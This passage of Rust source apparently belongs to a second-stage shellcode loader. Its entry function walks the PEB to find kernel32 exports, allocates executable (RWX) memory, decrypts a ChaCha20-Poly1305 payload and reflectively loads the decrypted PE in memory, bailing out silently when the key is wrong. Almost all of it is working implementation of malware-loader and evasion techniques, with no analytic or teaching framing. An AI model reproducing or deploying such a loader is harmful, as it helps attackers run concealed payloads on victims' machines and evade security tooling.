            // Determine the import-by-name RVA: prefer ILT, fall back to IAT.
            let name_src_rva = if ilt_rva != 0 {
                let ilt_slot = match ilt_rva.checked_add(idx * 8) {
                    Some(s) => s,
                    None => return false,
                };
                if ilt_slot + 8 > mapped.len() {
                    return false;
                }
                u64::from_le_bytes([
                    mapped[ilt_slot],
                    mapped[ilt_slot + 1],
                    mapped[ilt_slot + 2],
                    mapped[ilt_slot + 3],
                    mapped[ilt_slot + 4],
                    mapped[ilt_slot + 5],
                    mapped[ilt_slot + 6],
                    mapped[ilt_slot + 7],
                ])
            } else {
                iat_val
            };
            // Ordinal import? (high bit set on x64 ⇒ low 16 bits = ordinal.)
            let addr = if name_src_rva & 0x8000_0000_0000_0000 != 0 {
                let ord = (name_src_rva & 0xFFFF) as u16;
                let ord_bytes = ord.to_le_bytes();
                // SAFETY: boot.get_proc_address is the live kernel32 export.
                unsafe { (boot.get_proc_address)(module, ord_bytes.as_ptr()) }
            } else {
                // Import by name: name_src_rva points at a u16 hint + C string.
                let hint_rva = name_src_rva as usize;
                if hint_rva + 2 >= mapped.len() {
                    return false;
                }
                // Copy the hint/name struct into a stack buffer so
                // GetProcAddress sees a stable pointer.
                let mut buf = [0u8; 256];
                let mut name_off = hint_rva + 2;
                let mut blen = 0usize;
                while name_off < mapped.len() && mapped[name_off] != 0 && blen + 3 < buf.len() {
                    buf[blen + 2] = mapped[name_off];
                    name_off += 1;
                    blen += 1;
                }
                buf[blen + 2] = 0; // NUL-terminate
                // SAFETY: boot.get_proc_address is the live kernel32 export;
                // buf is a stable stack pointer for the duration of the call.
                unsafe { (boot.get_proc_address)(module, buf[2..].as_ptr()) }
            };
            if addr.is_null() {
                return false;
            }
            mapped[iat_slot..iat_slot + 8].copy_from_slice(&(addr as u64).to_le_bytes());
            idx += 1;
        }
        pos += 20;
    }
    true
}

/// Copy `name` into a NUL-terminated stack buffer and call `LoadLibraryA`.
///
/// # Safety
/// `load_lib` must be the live kernel32 `LoadLibraryA` export.
unsafe fn load_lib_nul(load_lib: LoadLibraryAFn, name: &[u8]) -> *mut c_void {
    let mut buf = [0u8; 260]; // MAX_PATH
    let n = name.len().min(buf.len() - 1);
    buf[..n].copy_from_slice(&name[..n]);
    buf[n] = 0;
    // SAFETY: buf is NUL-terminated; load_lib is a live kernel32 export.
    unsafe { load_lib(buf.as_ptr()) }
}

// ── Entry point ────────────────────────────────────────────────────────────
//
// `#[no_mangle]` so the dumper can find it by name; `extern "C"` so the Win64
// register ABI applies (rcx=arg0 …). The LAYER1 stub jumps here.

/// LAYER2 entry. Invoked by the LAYER1 bootstrap with:
///   - `key`     = &32-byte ChaCha20 key slot (rcx)
///   - `nonce`   = &12-byte nonce (rdx)
///   - `ct`      = &ciphertext || tag (r8)
///   - `ct_len`  = ciphertext byte count, excludes tag (r9)
///
/// Returns 0 on success, `usize::MAX` on tag mismatch, 1/2/3 on PEB/alloc/PE
/// failures. See the crate docs for the full table.
#[no_mangle]
pub extern "C" fn nyx_layer2_entry(
    key: *const u8,
    nonce: *const u8,
    ct: *const u8,
    ct_len: usize,
) -> usize {
    // ── 1. PEB walk → resolve VirtualAlloc / LoadLibraryA / GetProcAddress. ──
    // SAFETY: we run in a Windows user-mode thread (GS → TEB).
    let boot = match unsafe { resolve_bootstrap() } {
        Some(b) => b,
        None => return 1,
    };

    // ── 2. Allocate the output page (RWX) for the decrypted PE. ────────────
    // SAFETY: boot.virtual_alloc is a live kernel32 export.
    let out = unsafe {
        (boot.virtual_alloc)(
            core::ptr::null(),
            ct_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if out.is_null() {
        return 2;
    }

    // ── 3. Decrypt (in-place into `out`). ──────────────────────────────────
    // SAFETY: key is 32B, nonce 12B, ct is ct_len + 16 (tag) bytes, out is
    // ct_len bytes RW — all per the LAYER1 ABI.
    let ok = unsafe { chacha20poly1305_decrypt(key, nonce, ct, ct_len, out as *mut u8) };
    if !ok {
        // Tag mismatch: out is already zeroed by the decrypt routine. Return
        // usize::MAX as the spec'd silent-bail signal.
        return usize::MAX;
    }

    // ── 4. Reflective load + DllMain. ──────────────────────────────────────
    // SAFETY: out holds a valid decrypted PE of ct_len bytes; boot is live.
    let image = unsafe { core::slice::from_raw_parts(out as *const u8, ct_len) };
    if unsafe { reflective_load(image, &boot) } {
        0
    } else {
        3
    }
}

// ── Panic handler ──────────────────────────────────────────────────────────
//
// `panic = "abort"` (Cargo.toml + RUSTFLAGS) means a panic calls abort() via
// the lang item. We still must provide the #[panic_handler] for the no_std
// crate to compile.

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    // In PIC shellcode there's nothing useful to do with a panic. Loop forever
    // — the loader probe harness will time out and report the stall, which is
    // far more debuggable than an abort that disappears silently.
    loop {}
}
